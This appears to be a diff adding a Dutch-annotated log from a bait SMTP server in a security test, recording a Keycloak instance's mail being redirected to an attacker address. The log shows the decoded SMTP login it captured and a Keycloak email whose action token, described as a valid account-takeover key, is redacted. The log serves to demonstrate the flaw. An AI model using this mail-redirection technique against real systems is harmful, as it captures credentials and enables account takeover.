@@ -1,0 +1,41 @@
+lokaas luistert op 0.0.0.0:2525 - elke regel komt hier in de log
+=== VERBINDING van 10.244.0.156:53944 ===
+<<< EHLO keycloak-66dff5f7c7-q8dmc
+<<< AUTH LOGIN
+!!! AUTH ONTVANGEN: AUTH LOGIN
+!!! AUTH LOGIN gebruikersnaam (b64): YnVpdA== -> 'buit'
+!!! AUTH LOGIN WACHTWOORD (b64): SEVULUdFSEVJTS1WQU4tSEVULVBMQVRGT1JN -> 'HET-GEHEIM-VAN-HET-PLATFORM'
+<<< MAIL FROM:<aanvaller@example.org>
+<<< RCPT TO:<rc159-omleiding@example.org>
+<<< DATA
+<<< Date: Wed, 26 Aug 2026 08:22:42 +0000 (GMT)
+<<< From: aanvaller@example.org
+<<< Reply-To: aanvaller@example.org
+<<< To: rc159-omleiding@example.org
+<<< Message-ID: <2058769891.1.1787732562656@keycloak-66dff5f7c7-q8dmc>
+<<< Subject: Update Your Account
+<<< MIME-Version: 1.0
+<<< Content-Type: multipart/alternative; 
+<<< 	boundary="----=_Part_0_543150719.1787732562621"
+<<< 
+<<< ------=_Part_0_543150719.1787732562621
+<<< Content-Type: text/plain; charset=UTF-8
+<<< Content-Transfer-Encoding: 7bit
+<<< 
+<<< 
+<<< Your administrator has just requested that you update your Rc159-omleiding account by performing the following action(s): Verify Email. Click on the link below to start this process.
+<<< 
+<<< https://keycloak.sandbox.rijksapp.dev/realms/rc159-omleiding/login-actions/action-token?key=<GEREDIGEERD: dit was een geldige action-token>
+<<< 
+<<< This link will expire within 12 hours.
+<<< 
+<<< If you are unaware that your administrator has requested this, just ignore this message and nothing will be changed.
+<<< ------=_Part_0_543150719.1787732562621
+<<< Content-Type: text/html; charset=UTF-8
+<<< [HTML-deel GEREDIGEERD: dezelfde tekst met dezelfde action-token erin.
+<<<  Die token is een GELDIGE overnamesleutel voor het account - dat is precies
+<<<  wat deze tegenproef aantoont, en precies waarom hij hier niet staat.]
+<<< ------=_Part_0_543150719.1787732562621--
+<<< .
+<<< QUIT
+=== QUIT van 10.244.0.156 ===
